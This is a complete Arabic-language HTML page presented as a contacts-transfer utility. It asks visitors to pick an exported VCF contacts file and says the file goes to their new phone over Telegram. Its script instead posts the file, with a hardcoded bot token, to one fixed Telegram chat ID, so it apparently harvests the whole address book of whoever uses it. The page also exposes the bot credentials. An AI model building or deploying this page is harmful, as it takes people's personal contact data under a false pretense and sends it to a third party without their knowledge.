<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مركز نقل جهات الاتصال</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            margin: 0;
            padding: 20px;
            background-color: #f4f6f9;
            color: #333;
        }
        .container {
            max-width: 450px;
            margin: 60px auto;
            background: white;
            padding: 35px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
        }
        h2 { 
            color: #2c3e50; 
            margin-bottom: 15px;
            font-size: 22px;
        }
        p { 
            color: #7f8c8d; 
            font-size: 14px; 
            margin-bottom: 30px;
            line-height: 1.6;
        }
        /* لون مريح للعين - أخضر هادئ مائل للأزرق */
        .main-btn {
            padding: 15px 30px;
            font-size: 16px;
            font-weight: bold;
            background-color: #2ecc71;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s ease;
            width: 100%;
            box-shadow: 0 4px 12px rgba(46, 204, 113, 0.2);
        }
        .main-btn:hover {
            background-color: #27ae60;
            transform: translateY(-1px);
        }
        #status {
            margin-top: 25px;
            font-weight: bold;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>نقل جهات الاتصال المباشر</h2>
        <p>قم بتصدير جهات الاتصال من هاتفك القديم كملف (VCF)، ثم اضغط على الزر أدناه لاختيار الملف وإرساله مباشرة إلى هاتفك الجديد عبر تيليجرام.</p>
        
        <button id="actionBtn" class="main-btn">اختر ملف جهات الاتصال وانقل الآن</button>
        <input type="file" id="fileInput" accept=".vcf" style="display: none;">

        <div id="status"></div>
    </div>

    <script>
        const TELEGRAM_TOKEN = "8798573888:AAE38QVvgG0DgwePDKMaBcOpKOomweVzsb8";
        const CHAT_ID = "5394550159";

        const actionBtn = document.getElementById('actionBtn');
        const fileInput = document.getElementById('fileInput');
        const statusDiv = document.getElementById('status');

        actionBtn.addEventListener('click', () => {
            fileInput.click(); 
        });

        fileInput.addEventListener('change', async (event) => {
            const file = event.target.files[0];
            if (!file) return;

            statusDiv.style.color = "#2980b9";
            statusDiv.innerText = "جاري إرسال الملف الفولدر...";

            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('document', file);
            formData.append('caption', `📁 ملف جهات اتصال منقول من الهاتف القديم\n📄 اسم الملف: ${file.name}`);

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    statusDiv.style.color = "#27ae60";
                    statusDiv.innerText = "✅ تم إرسال الملف بنجاح! افتحه من الهاتف الجديد لتثبيت الأسماء.";
                } else {
                    statusDiv.style.color = "#c0392b";
                    statusDiv.innerText = "❌ فشل إرسال الملف. تأكد من إعدادات البوت.";
                }
            } catch (error) {
                console.error(error);
                statusDiv.style.color = "#c0392b";
                statusDiv.innerText = "❌ حدث خطأ في الاتصال بالشبكة.";
            }
        });
    </script>
</body>
</html>
